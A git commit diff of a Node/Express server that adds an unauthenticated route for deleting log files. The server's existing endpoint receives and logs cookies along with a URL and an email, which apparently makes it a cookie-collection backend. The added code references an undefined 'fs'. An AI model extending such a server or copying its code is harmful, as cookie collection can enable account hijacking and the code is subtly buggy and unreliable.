41aa49f3943c28781cc143e097df435ffb768a78
Sajawal Fareedi <sajawalfareedi448@gmail.com>
2024-03-08 13:03:17 +0500

    Added route for deleting log files

--- server.js
+++ server.js
@@ -2,6 +2,8 @@ const express = require("express");
 const utils = require('./utils');
 const logger = require("./logger");
 const cors = require("cors");
+const { unlinkSync, open } = require("fs");
+
 const app = express();
 
 const PORT = process.env.PORT || 3000;
@@ -19,7 +21,7 @@ app.get("/", async (req, res) => {
 });
 
 app.post("/", (req, res) => {
-    logger.log(2, `\nNew Cookies received: ${req.body.url}, ${req.body.email}`);
+    logger.log(2, `New Cookies received: ${req.body.url}, ${req.body.email}`);
     utils.handleCookies(req.body);
     res.json("Data recieved successfully!");
 
@@ -28,12 +30,33 @@ app.post("/", (req, res) => {
 app.get("/download_log_file", (req, res) => {
     const filename = req.query.filename;
 
-    if (!filename) return res.status(400).send("Missing file path in query params.");
-    if (!["errors", "info", "warnings"].includes(filename)) return res.status(400).send("This provided file is not available.");
+    if (!filename) return res.status(400).send({ error: "Missing file path in query params." });
+    if (!["errors", "info", "warnings"].includes(filename)) return res.status(400).send({ error: "This provided file is not available." });
 
     res.download(`./logs/${filename}.log`);
+});
+
+app.get("/delete_log_file", (req, res) => {
+    const filename = req.query.filename;
+
+    if (!filename) return res.status(400).send({ error: "Missing file path in query params." });
+    if (!["errors", "info", "warnings"].includes(filename)) return res.status(400).send({ error: "This provided file is not available." });
+
+    try {
+        unlinkSync(`./logs/${filename}.log`);
+
+        open(`./logs/${filename}.log`, "wx", function (err, fd) {
+            // handle error
+            fs.close(fd, function (err) { /*handle error*/ });
+        });
+
+        res.send({ status: "success" });
+    } catch (error) {
+        res.status(500).send({ error: error });
+    };
+    
 })
 
 app.listen(PORT, () => {
-    logger.log(2, `\nServer is running on port ${PORT}`);
+    logger.log(2, `Server is running on port ${PORT}`);
 });
